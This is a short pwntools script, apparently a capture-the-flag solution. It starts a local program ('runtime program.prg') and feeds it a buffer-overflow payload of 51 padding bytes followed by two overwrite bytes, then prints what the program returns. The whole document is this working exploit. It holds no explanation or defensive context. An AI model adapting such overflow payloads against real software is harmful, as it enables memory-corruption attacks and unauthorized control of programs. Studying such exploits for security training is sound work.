from pwn import *

p = process(["runtime", "program.prg"])
p.sendline(b"a"*51 + b"\xbd\xc0")
print(p.readall())
